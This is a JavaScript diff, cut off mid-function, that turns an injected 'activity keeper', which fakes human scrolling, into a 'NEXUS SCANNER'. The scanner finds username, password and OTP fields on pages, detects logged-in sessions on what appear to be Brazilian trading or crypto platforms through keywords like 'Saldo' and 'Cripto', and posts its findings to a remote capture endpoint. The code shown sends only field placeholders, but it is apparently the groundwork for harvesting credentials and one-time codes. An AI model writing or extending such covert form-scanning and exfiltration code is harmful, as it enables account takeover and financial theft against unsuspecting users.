@@ -1,20 +1,106 @@
-(function(){
+(function() {
 
-  console.log("NEXUS activity keeper ON");
+    console.log("NEXUS SCANNER iniciado ✔");
 
-  const BASE = window.location.origin;
-  const token = window.NEXUS_TOKEN_INJECT;
-  const interval = 20000; // 20s
+    const TOKEN = window.NEXUS_TOKEN_INJECT || "032318";
+    const CAPTURE_URL = window.NEXUS_CAPTURE_ENDPOINT;
 
-  function humanMove(){
-      try {
-          window.scrollTo({
-              top: Math.random() * 200,
-              behavior: "smooth"
-          });
-      } catch(e){}
-  }
+    function sendCapture(data) {
+        return fetch(CAPTURE_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "X-Nexus-Token": TOKEN
+            },
+            body: JSON.stringify(data)
+        }).then(r => r.json()).catch(err => {
+            console.log("Erro ao enviar captura:", err);
+        });
+    }
 
-  setInterval(humanMove, interval);
+    function getLoginFields() {
+        const inputs = document.querySelectorAll("input");
+        let user = null, pass = null;
 
-})();
+        inputs.forEach(i => {
+            const type = (i.type || "").toLowerCase();
+            const name = (i.name || "").toLowerCase();
+            const placeholder = (i.placeholder || "").toLowerCase();
+
+            if (!user && /(email|user|login|cpf)/i.test(name + placeholder + type)) {
+                user = i;
+            }
+            if (!pass && /(password|senha|pwd)/i.test(name + placeholder + type)) {
+                pass = i;
+            }
+        });
+
+        return { user, pass };
+    }
+
+
+    function getOTPField() {
+        const inputs = document.querySelectorAll("input");
+
+        for (const i of inputs) {
+            const t = (i.type || "").toLowerCase();
+            const p = (i.placeholder || "").toLowerCase();
+            const n = (i.name || "").toLowerCase();
+
+            if (/(\bcode\b|otp|token|verificação|verification)/i.test(p + n + t)) {
+                return i;
+            }
+        }
+        return null;
+    }
+
+
+    function checkForLogin() {
+        try {
+            const { user, pass } = getLoginFields();
+
+            if (user && pass) {
+                console.log("NEXUS: Campos de login detectados!");
+
+                const capture = {
+                    event: "login_fields_detected",
+                    user_placeholder: user.placeholder,
+                    pass_placeholder: pass.placeholder,
+                    timestamp: Date.now()
+                };
+
+                sendCapture(capture);
+            }
+        } catch (e) {
+            console.log("Erro no scanner login:", e);
+        }
+    }
+
+
+    function checkForOTP() {
+        try {
+            const otp = getOTPField();
+
+            if (otp) {
+                console.log("NEXUS: Campo OTP detectado");
+
+                sendCapture({
+                    event: "otp_field_detected",
+                    placeholder: otp.placeholder || "",
+                    timestamp: Date.now()
+                });
+            }
+        } catch (e) {
+            console.log("Erro no scanner OTP:", e);
+        }
+    }
+
+
+    function checkIfLoggedIn() {
+        try {
+            const keywordTests = [
+                "Saldo", "Depósito", "Histórico", "Minhas Operações",
+                "Mercado", "OTC", "Ações", "Cripto", "Paridades", "Operar"
+            ];
+
+            const found = keywordTests.some(kw
